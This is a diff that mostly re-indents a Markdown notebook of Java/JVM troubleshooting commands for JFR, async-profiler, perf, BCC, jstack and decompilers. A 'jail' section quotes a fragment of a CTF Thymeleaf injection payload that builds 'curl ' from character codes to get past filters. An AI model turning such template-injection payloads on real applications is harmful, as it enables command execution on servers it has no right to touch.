@@ -5,7 +5,7 @@
 
 - [VM Options Explorer \- OpenJDK11 HotSpot](https://chriswhocodes.com/)
 - [GitHub \- aragozin/jvm\-tools: Small set of tools for JVM troublshooting, monitoring and profiling\.](https://github.com/aragozin/jvm-tools)
-	- e.g. https://thelastpickle.com/blog/2018/01/16/cassandra-flame-graphs.html
+    - e.g. https://thelastpickle.com/blog/2018/01/16/cassandra-flame-graphs.html
 - [GitHub \- openjdk/jmh\-jdk\-microbenchmarks: https://openjdk\.org/projects/code\-tools/jmh\-jdk\-microbenchmarks](https://github.com/openjdk/jmh-jdk-microbenchmarks)
 - [HotSpot Tools](https://wiki.openjdk.java.net/display/HotSpot/HotSpot+Tools)
 - [Notes on debugging HotSpot’s JIT compilation \| Jorn Vernee](https://jornvernee.github.io/hotspot/jit/2023/08/18/debugging-jit.html)
@@ -16,15 +16,15 @@
 
 ```java
 Pattern.compile("date\\(.*\\)").matcher(value).find()
-    
+
 File dump = new File("D:\\dump");
-try{
+try {
     PrintWriter writer = new PrintWriter("D:\\asdf", "UTF-8");
     writer.println(clazz.toString());
     writer.println(name.toString());
     writer.close();
 } catch (IOException e) {
-	return "";
+    return "";
 }
 
 return clazz.toString() + " ---- " + name.toString();
@@ -248,16 +248,16 @@ jconsole
 
 - ~/code/snippets/java/Deadlock.java
 - stack traces
-	```bash
-	jstack $pid
-	```
+    ```bash
+    jstack $pid
+    ```
 - code dump
-	- https://docs.oracle.com/javase/9/tools/jhsdb.htm
-		- `sudo $JAVA_HOME/bin/java -cp $JAVA_HOME/lib/sa-jdi.jar sun.jvm.hotspot.CLHSDB`
-	- [A deadlock in the VM triggered by a BTrace script · GitHub](https://gist.github.com/rednaxelafx/2158975)
-		```
-		pstack -v
-		```
+    - https://docs.oracle.com/javase/9/tools/jhsdb.htm
+        - `sudo $JAVA_HOME/bin/java -cp $JAVA_HOME/lib/sa-jdi.jar sun.jvm.hotspot.CLHSDB`
+    - [A deadlock in the VM triggered by a BTrace script · GitHub](https://gist.github.com/rednaxelafx/2158975)
+        ```
+        pstack -v
+        ```
 
 # Profiling
 
@@ -541,8 +541,8 @@ where
 ````
 
 - scriptable debugger
-	- https://youdebug.kohsuke.org/
-	- http://java.sun.com/javase/6/docs/technotes/guides/jpda/architecture.html#jdi
+    - https://youdebug.kohsuke.org/
+    - http://java.sun.com/javase/6/docs/technotes/guides/jpda/architecture.html#jdi
 - https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/tooldescr011.html
 - https://www.infoq.com/articles/Troubleshooting-Java-Memory-Issues/
 
@@ -840,56 +840,58 @@ metrics
 - profiling during load
     1. HPROF -> JVM flags
     2. Java Flight Recording (JFR)
-		- JVM flags
-			```
-			-XX:+UnlockCommercialFeatures -XX:+FlightRecorder
-			-XX:FlightRecorderOptions=loglevel=info
-			-XX:StartFlightRecording=delay=20s,duration=60s,name=MyRecording,filename=C:\TEMP\myrecording.jfr,settings=profile
-			||
-			-XX:+UnlockCommercialFeatures -XX:+FlightRecorder
-			-XX:FlightRecorderOptions=defaultrecording=true,dumponexit=true,dumponexitpath=C:\demos\dumponexit.jfr
-			||
-			-XX:+UnlockCommercialFeatures -XX:+UnlockDiagnosticVMOptions -XX:+DebugNonSafepoints -XX:+FlightRecorder
-			```
-		- jcmd
-			```bash
-			# ? jcmd 1234 VM.unlock_commercial_features
-			jcmd 1234 JFR.start name=MyRecording settings=profile delay=20s duration=2m filename=C:\TEMP\myrecording.jfr
-			jcmd 1234 JFR.check
-			jcmd 1234 JFR.stop
-			jcmd 1234 JFR.dump name=MyRecording filename=C:\TEMP\myrecording.jfr
-			# ! Analyse dump with JMC parser
-			```
+        - JVM flags
+            ```
+            -XX:+UnlockCommercialFeatures -XX:+FlightRecorder
+            -XX:FlightRecorderOptions=loglevel=info
+            -XX:StartFlightRecording=delay=20s,duration=60s,name=MyRecording,filename=C:\TEMP\myrecording.jfr,settings=profile
+            ||
+            -XX:+UnlockCommercialFeatures -XX:+FlightRecorder
+            -XX:FlightRecorderOptions=defaultrecording=true,dumponexit=true,dumponexitpath=C:\demos\dumponexit.jfr
+            ||
+            -XX:+UnlockCommercialFeatures -XX:+UnlockDiagnosticVMOptions -XX:+DebugNonSafepoints -XX:+FlightRecorder
+            ```
+        - jcmd
+            ```bash
+            # ? jcmd 1234 VM.unlock_commercial_features
+            jcmd 1234 JFR.start name=MyRecording settings=profile delay=20s duration=2m filename=C:\TEMP\myrecording.jfr
+            jcmd 1234 JFR.check
+            jcmd 1234 JFR.stop
+            jcmd 1234 JFR.dump name=MyRecording filename=C:\TEMP\myrecording.jfr
+            # ! Analyse dump with JMC parser
+            jfr view all-views myrecording.jfr
+            jfr print myrecording.jfr
+            ```
     3. Attach to JVM at runtime
-		- https://github.com/jvm-profiling-tools/async-profiler
-			```bash
-			./profiler.sh -d 10 -e alloc -o summary,flat `pidof java`
-			```
-		- https://github.com/patric-r/jvmtop
+        - https://github.com/jvm-profiling-tools/async-profiler
+            ```bash
+            ./profiler.sh -d 10 -e alloc -o summary,flat `pidof java`
+            ```
+        - https://github.com/patric-r/jvmtop
     4. OS-Level -> perf report thread ids -(xref)-> jcmd thread dump ids
-		- ~/code/doc/java/srecon18americas_slides_goldshtein.pdf
-		```bash
-		git clone https://github.com/BrendanGregg/FlameGraph
-		sudo perf record -F 97 -g -p `pidof java` -- sleep 10
-		sudo perf script \
-			| FlameGraph/stackcollapse-perf.pl \
-			| FlameGraph/flamegraph.pl \
-			> flame.svg
-		```
-	5. OS-Level -> BCC probes
-		```bash
-		# Enumeration
-		tplist -p $(pidof java) | grep 'hotspot.*gc'
-		nm -C $(find /usr/lib/debug -name libjvm.so.debug) | grep 'card.*table'
-		# Trace
-		trace 'r:/usr/bin/bash:readline "%s", retval'
-		LIBJVM=$(find /usr/lib -name libjvm.so)
-		funccount -p $(pidof java) "$LIBJVM:*do_collection*"
-		# Heap
-		funccount -p $(pidof java) u:$LIBJVM:object__alloc
-		argdist -p $(pidof java) -C "u:$LIBJVM:object__alloc():char*:arg2"
-		```
-	- https://github.com/epickrram/grav
+        - ~/code/doc/java/srecon18americas_slides_goldshtein.pdf
+        ```bash
+        git clone https://github.com/BrendanGregg/FlameGraph
+        sudo perf record -F 97 -g -p `pidof java` -- sleep 10
+        sudo perf script \
+            | FlameGraph/stackcollapse-perf.pl \
+            | FlameGraph/flamegraph.pl \
+            > flame.svg
+        ```
+    5. OS-Level -> BCC probes
+        ```bash
+        # Enumeration
+        tplist -p $(pidof java) | grep 'hotspot.*gc'
+        nm -C $(find /usr/lib/debug -name libjvm.so.debug) | grep 'card.*table'
+        # Trace
+        trace 'r:/usr/bin/bash:readline "%s", retval'
+        LIBJVM=$(find /usr/lib -name libjvm.so)
+        funccount -p $(pidof java) "$LIBJVM:*do_collection*"
+        # Heap
+        funccount -p $(pidof java) u:$LIBJVM:object__alloc
+        argdist -p $(pidof java) -C "u:$LIBJVM:object__alloc():char*:arg2"
+        ```
+    - https://github.com/epickrram/grav
     - https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/tooldescr006.html
     - http://blog2.vorburger.ch/2018/08/how-to-profile-performance-and-memory.html
     - https://www.oracle.com/technetwork/oem/soa-mgmt/con10912-javaflightrecorder-2342054.pdf
@@ -1151,7 +1153,7 @@ eval throw new RuntimeException("boom")
 eval return
 ```
 
-### With classes and sources 
+### With classes and sources
 
 [](#parse_classpath)
 
@@ -1191,7 +1193,7 @@ https://stackoverflow.com/questions/1096148/how-to-check-the-jdk-version-used-to
 # constant pool
 
 ```
-invokedynamic	0:apply (Lorg/assertj/core/util/introspection/FieldSupport;Ljava/lang/String;Ljava/lang/Class;)Ljava/util/function/Function; (165)
+invokedynamic    0:apply (Lorg/assertj/core/util/introspection/FieldSupport;Ljava/lang/String;Ljava/lang/Class;)Ljava/util/function/Function; (165)
     165)CONSTANT_InvokeDynamic[18](bootstrap_method_attr_index = 0, name_and_type_index = 164)
     164)CONSTANT_NameAndType[12](name_index = 162, signature_index = 163)
     162)CONSTANT_Utf8[1]("apply")
@@ -1300,8 +1302,8 @@ jdeps --jdk-internals -recursive --class-path 'lib/*'
         <artifactId>maven-surefire-plugin
         <configuration>
             <argLine>
-                --add-exports, 
-                --add-opens=java.base/java.lang=ALL-UNNAMED, 
+                --add-exports,
+                --add-opens=java.base/java.lang=ALL-UNNAMED,
                 --permit-illegal-access
 
 <build>
@@ -1346,31 +1348,31 @@ module foo {
 ```bash
 # Create
 echo 'Main-Class: com.mypackage.MyClass' > MANIFEST.MF \
-	&& jar cmvf MANIFEST.MF babyrev.jar -C com .
+    && jar cmvf MANIFEST.MF babyrev.jar -C com .
 
 # Enumerate
 find . -type f -iname '*.jar' -exec sh -c '
 manifest=$(jar tf "{}" | grep -m 1 -i manifest.mf)
 test -n "$manifest" \
-	&& unzip -p "{}" "$manifest" \
-	| grep -i main-class \
-	&& echo "{}"
+    && unzip -p "{}" "$manifest" \
+    | grep -i main-class \
+    && echo "{}"
 ' \; 2>/dev/null
 ```
 
 # decompilation
 
 - fernflower
-	- https://github.com/JetBrains/intellij-community/blob/master/plugins/java-decompiler/engine/README.md
-	- mirror
-		- https://github.com/fesh0r/fernflower
+    - https://github.com/JetBrains/intellij-community/blob/master/plugins/java-decompiler/engine/README.md
+    - mirror
+        - https://github.com/fesh0r/fernflower
 - procyon
-	- https://github.com/mstrobel/procyon
-		- `./gradlew :Procyon.Decompiler:fatJar -x test`
-	- GUI
-		- https://github.com/Konloch/bytecode-viewer
-			- if: given class directory, create [jar](#runnable-jar)
-		- https://github.com/deathmarine/Luyten
+    - https://github.com/mstrobel/procyon
+        - `./gradlew :Procyon.Decompiler:fatJar -x test`
+    - GUI
+        - https://github.com/Konloch/bytecode-viewer
+            - if: given class directory, create [jar](#runnable-jar)
+        - https://github.com/deathmarine/Luyten
 
 ```bash
 find . -type f -iname '*.jar' | \
@@ -1381,20 +1383,20 @@ xargs -I{} sh -c '
 
 # Given jar
 mkdir -p ./out && \
-	find . -type f -iname '*.jar' | \
-	xargs -I{} java -jar ~/share/opt/fernflower/build/libs/fernflower.jar {} ./out/
+    find . -type f -iname '*.jar' | \
+    xargs -I{} java -jar ~/share/opt/fernflower/build/libs/fernflower.jar {} ./out/
 
 # Given class directory `classes`
 mkdir -p ./out && \
-	java -jar ~/share/opt/fernflower/build/libs/fernflower.jar ./classes/ ./out/
+    java -jar ~/share/opt/fernflower/build/libs/fernflower.jar ./classes/ ./out/
 # ||
 find ./classes/ -iname '*.class' | \
-	sort | \
-	while read -r i; do 
-		d=$(dirname "$i")
-		mkdir -p ./out/"$d"
-		java -jar ~/share/opt/fernflower/build/libs/fernflower.jar "$i" ./out/"$d"/
-	done
+    sort | \
+    while read -r i; do
+        d=$(dirname "$i")
+        mkdir -p ./out/"$d"
+        java -jar ~/share/opt/fernflower/build/libs/fernflower.jar "$i" ./out/"$d"/
+    done
 ```
 
 # remote method invocation (RMI)
@@ -1408,9 +1410,9 @@ https://medium.com/@afinepl/java-rmi-for-pentesters-part-two-reconnaissance-atta
 # jail
 
 - https://github.com/w181496/CTF/tree/master/wctf2020/thymeleaf
-	```
-	(0).toString().charAt(0).toChars(99)%5b0%5d.toString()+(0).toString().charAt(0).toChars(117)%5b0%5d.toString()+(0).toString().charAt(0).toChars(114)%5b0%5d.toString()+(0).toString().charAt(0).toChars(108)%5b0%5d.toString()+(0).toString().charAt(0).toChars(32)%5b0%5d.toString()+
-	```
+    ```
+    (0).toString().charAt(0).toChars(99)%5b0%5d.toString()+(0).toString().charAt(0).toChars(117)%5b0%5d.toString()+(0).toString().charAt(0).toChars(114)%5b0%5d.toString()+(0).toString().charAt(0).toChars(108)%5b0%5d.toString()+(0).toString().charAt(0).toChars(32)%5b0%5d.toString()+
+    ```
 
 # case studies
 
@@ -1423,8 +1425,8 @@ https://medium.com/@afinepl/java-rmi-for-pentesters-part-two-reconnaissance-atta
 ### performance
 
 - `corePoolSize=0` causes worker queue busy polling
-	- [100% CPU: My Fault?](https://josephmate.github.io/2021-10-03-my-bug-used-up-100cpu-or-did-it/)
-	- [\(JDK\-8129861\) High processor load for ScheduledThreadPoolExecutor with 0 core threads \- Java Bug System](https://bugs.openjdk.java.net/browse/JDK-8129861)
+    - [100% CPU: My Fault?](https://josephmate.github.io/2021-10-03-my-bug-used-up-100cpu-or-did-it/)
+    - [\(JDK\-8129861\) High processor load for ScheduledThreadPoolExecutor with 0 core threads \- Java Bug System](https://bugs.openjdk.java.net/browse/JDK-8129861)
 - [Java vs\. Scala: Divided We Fail](https://shipilev.net/blog/2014/java-scala-divided-we-fail/)
 
 - [Vanilla Java](http://vanillajava.blogspot.com/)
